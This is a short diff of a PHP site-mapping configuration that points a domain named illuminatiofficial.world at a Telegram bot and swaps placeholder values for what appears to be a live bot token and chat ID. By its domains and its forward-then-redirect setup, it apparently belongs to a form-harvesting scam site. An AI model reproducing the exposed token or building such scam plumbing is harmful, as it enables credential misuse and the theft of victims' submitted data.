@@ -16,9 +16,9 @@ $site_map = [
         "redirect" => "https://illuminatiofficial.org/thank-you/" // Change to your thank you page
     ],
     
-    "localhost" => [
+    "illuminatiofficial.world" => [
         "bots" => [
-            ['token' => 'YOUR_BOT_TOKEN_HERE', 'chat_id' => 'YOUR_CHAT_ID_HERE'],
+            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
         "redirect" => "http://illuminatiofficial.world/index.html"
     ],
